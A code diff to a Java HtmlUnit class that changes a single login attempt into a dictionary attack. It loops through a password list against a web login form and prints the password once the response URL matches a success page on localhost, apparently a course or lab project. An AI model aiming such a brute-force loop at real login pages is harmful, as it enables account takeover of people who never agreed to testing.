@@ -29,6 +29,7 @@ public class FormLogin {
 
     public void setup(){
         client = new WebClient();
+
         try {
             HtmlPage page = (HtmlPage) client.getPage(url);
             form = page.getFormByName("login");
@@ -37,31 +38,42 @@ public class FormLogin {
         }
     }
 
-    public void login(){
+    public void login() {
 
-        try {
 
-            form.getInputByName("username").setValueAttribute(username);
-            form.getInputByName("password").setValueAttribute(dictionary.get(0));
+        for (int i = 0; i < dictionary.size(); i++) {
 
-            HtmlElement button = form.getElementsByAttribute("input", "value", "Submit").get(0);
+            try {
 
+                String password = dictionary.get(i);
+
+                form.getInputByName("username").setValueAttribute(username);
+
+                form.getInputByName("password").setValueAttribute(password);
+
+                HtmlElement button = form.getElementsByAttribute("input", "value", "Submit").get(0);
 
 //            DomElement button = page.createElement("button");
 //            button.setAttribute("type", "submit");
 //            form.appendChild(button);
-      //     Page result = button.click();
+                //     Page result = button.click();
 
-            Page result = button.click();
-            String resultUrl = result.getUrl().toString();
+                Page result = button.click();
+                String resultUrl = result.getUrl().toString();
 
-            System.out.println(resultUrl);
+                if(resultUrl.equals("http://localhost/3200-project/success.html")){
+                    System.out.println("Success! Password is " + password);
+                    break;
+                } else {
+                    System.out.println("Failed attempt with password: " + password);
+                }
 
 
-        } catch (IOException e) {
-            e.printStackTrace();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+
         }
-
     }
 
 
